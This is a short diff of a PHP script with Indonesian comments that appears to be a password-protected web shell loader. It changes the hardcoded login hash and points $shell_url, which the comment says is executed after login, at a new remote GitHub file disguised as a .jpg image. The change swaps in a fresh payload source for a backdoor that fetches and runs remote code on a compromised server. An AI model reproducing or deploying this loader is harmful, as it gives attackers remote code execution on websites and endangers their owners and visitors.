@@ -3,10 +3,10 @@ session_start();
 
 // ================== KONFIGURASI ==================
 $username    = "K1nG";
-$passwordHash = '$2y$12$4JMp9E/np/2k8t.eodqdDewZfI8h8iCMyQAdCnIFUW0oBD4LTE2hO'; // bcrypt hash
+$passwordHash = '$2a$20$zh1tAXTIZ2DgqPVtrcBu9uVS8AUBGK7WdcZLI6KJb6SnNGoMaJz7K'; // bcrypt hash
 
 // URL shell yang akan dieksekusi setelah login
-$shell_url = 'https://raw.githubusercontent.com/FamilyLizard/ghostshell/refs/heads/main/cyber404.jpg';
+$shell_url = 'https://raw.githubusercontent.com/lype2/LypeSession/refs/heads/main/lype404.jpg';
 
 // ================== LOGIC LOGIN ==================
 if (!isset($_SESSION['loggedin'])) {
